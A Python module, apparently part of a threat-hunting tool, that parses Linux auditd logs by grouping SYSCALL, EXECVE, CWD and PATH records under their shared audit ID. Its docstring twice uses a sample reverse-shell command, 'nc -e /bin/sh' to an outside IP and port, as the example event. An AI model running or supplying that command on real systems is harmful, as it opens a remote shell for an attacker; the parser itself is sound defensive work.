"""
A real Linux auditd log parser (/var/log/audit/audit.log format).

The key real-world detail this module exists to handle correctly: one
auditd "event" (one syscall's full context) is NOT one log line - it's
several lines of DIFFERENT record types that all share the same audit
ID (`msg=audit(<timestamp>.<msec>:<serial>)`). A single `execve()` call
typically produces at least three real lines:

  type=SYSCALL msg=audit(1731939600.100:1001): arch=... syscall=59
      success=yes ... auid=1000 uid=0 comm="bash" exe="/bin/bash" key="..."
  type=EXECVE  msg=audit(1731939600.100:1001): argc=3 a0="bash" a1="-c"
      a2="nc -e /bin/sh 203.0.113.9 4444"
  type=CWD     msg=audit(1731939600.100:1001):  cwd="/home/user"
  type=PATH    msg=audit(1731939600.100:1001): item=0 name="/usr/bin/bash" ...

A parser that reads line-by-line without grouping by that shared
`timestamp:serial` ID would see "a SYSCALL happened" and "an EXECVE
happened" as two disconnected facts, instead of one event where a shell
command was actually "nc -e /bin/sh 203.0.113.9 4444" - the EXECVE
record's `a0`/`a1`/`a2`... arguments ARE the real command line, and
they only mean anything joined back together under the SYSCALL record's
process context (comm/exe/uid/auid).

`SYSCALL_NAMES` maps the real x86_64 syscall numbers auditd logs
(numeric, not symbolic) to the names a human actually reasons about.
"""
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone

_RECORD_RE = re.compile(r'type=(\S+)\s+msg=audit\((\d+\.\d+):(\d+)\):\s*(.*)')
_KV_RE = re.compile(r'(\w+)=(?:"([^"]*)"|(\S+))')

# Real x86_64 Linux syscall numbers for the ones this hunter cares about.
SYSCALL_NAMES = {
    "2": "open", "257": "openat", "59": "execve", "105": "setuid",
    "117": "setresuid", "42": "connect", "87": "unlink",
}


@dataclass
class AuditEvent:
    serial: str
    timestamp: datetime
    syscall_num: str
    syscall_name: str
    success: str
    comm: str
    exe: str
    uid: str
    auid: str
    key: str
    command: str          # joined EXECVE argv, if this event has one
    paths: list = field(default_factory=list)


def parse_kv(text: str) -> dict:
    fields = {}
    for m in _KV_RE.finditer(text):
        key = m.group(1)
        value = m.group(2) if m.group(2) is not None else m.group(3)
        fields[key] = value
    return fields


def _parse_record(line: str):
    m = _RECORD_RE.match(line.strip())
    if not m:
        return None
    rtype, ts, serial, rest = m.groups()
    return rtype, ts, serial, parse_kv(rest)


def load_events(path: str) -> list:
    groups = {}   # serial -> {"ts": str, "records": {type: fields_or_list}}
    order = []
    with open(path) as fh:
        for line in fh:
            if not line.strip() or line.startswith("#"):
                continue
            parsed = _parse_record(line)
            if not parsed:
                continue
            rtype, ts, serial, fields = parsed
            if serial not in groups:
                groups[serial] = {"ts": ts, "records": {}}
                order.append(serial)
            records = groups[serial]["records"]
            if rtype == "PATH":
                records.setdefault("PATH", []).append(fields)
            elif rtype == "EXECVE":
                argc = int(fields.get("argc", "0"))
                argv = [fields.get(f"a{i}", "") for i in range(argc)]
                records["EXECVE"] = {"argv": argv, "command": " ".join(argv)}
            else:
                records[rtype] = fields

    events = []
    for serial in order:
        g = groups[serial]
        syscall = g["records"].get("SYSCALL", {})
        execve = g["records"].get("EXECVE", {})
        paths = [p.get("name", "") for p in g["records"].get("PATH", [])]
        syscall_num = syscall.get("syscall", "")
        events.append(AuditEvent(
            serial=serial,
            timestamp=datetime.fromtimestamp(float(g["ts"]), tz=timezone.utc),
            syscall_num=syscall_num,
            syscall_name=SYSCALL_NAMES.get(syscall_num, syscall_num or "?"),
            success=syscall.get("success", "?"),
            comm=syscall.get("comm", "?"),
            exe=syscall.get("exe", "?"),
            uid=syscall.get("uid", "?"),
            auid=syscall.get("auid", "?"),
            key=syscall.get("key", "(none)"),
            command=execve.get("command", ""),
            paths=paths,
        ))
    events.sort(key=lambda e: e.timestamp)
    return events
